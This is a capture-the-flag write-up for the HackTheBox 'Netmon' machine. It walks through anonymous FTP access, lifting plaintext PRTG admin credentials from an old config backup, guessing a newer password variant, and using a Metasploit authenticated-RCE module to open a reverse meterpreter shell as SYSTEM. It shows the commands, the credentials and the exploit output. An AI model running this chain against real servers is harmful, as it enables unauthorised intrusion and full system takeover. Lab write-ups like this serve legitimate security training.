# CTF - [HackTheBox Netmon](https://app.hackthebox.com/machines/Netmon)
nmap:
```
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
```
Started probing the FTP server. Found the first flag under `/Users/Public`.
```
ftp> pwd
257 "/Users/Public" is current directory.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  07:05AM       <DIR>          Documents
07-16-16  08:18AM       <DIR>          Downloads
07-16-16  08:18AM       <DIR>          Music
07-16-16  08:18AM       <DIR>          Pictures
02-02-19  11:35PM                   33 user.txt
07-16-16  08:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get user.txt -
```
According to [this documentation](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data), Paessler stores its data under `ProgramData`.
I downloaded the entire directory for further investigation:
```
wget -m ftp://10.10.10.152/ProgramData/Paessler
```
The `PRTG COnfiguration.old.bak` file contains some database credentials.
```
            <dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
            </dbpassword>
```
Tried logging into the site, however it still failed. Considering that the file I got this from was the "old" version, a variation of the password might work.
Tried `PrTg@dmin2019` and it worked...
<br/><br/>
![paessler](https://user-images.githubusercontent.com/59718043/142748250-11df4a10-2c4f-41db-9b9f-4ff9f01d2e5a.png)
<br/><br/>
The next move was to open a meterpreter session and get a shell. I already figured that there was a Metasploit module for PRTG, all I needed was the right credentials.
```
msf6 exploit(windows/http/prtg_authenticated_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.5:4444 
[+] Successfully logged in with provided credentials
[+] Created malicious notification (objid=2020)
[+] Triggered malicious notification
[+] Deleted malicious notification
[*] Waiting for payload execution.. (30 sec. max)
[*] Sending stage (175174 bytes) to 10.10.10.152
[*] Meterpreter session 3 opened (10.10.14.5:4444 -> 10.10.10.152:58258 ) at 2021-11-20 22:33:08 -0500

meterpreter > shell
Process 1728 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
This challenge did not require any privilege escalation. The root flag can be easily found under `C:\Users\Administrator\Desktop>`.
```
c:\Users\Administrator\Desktop>whoami
whoami
nt authority\system
```
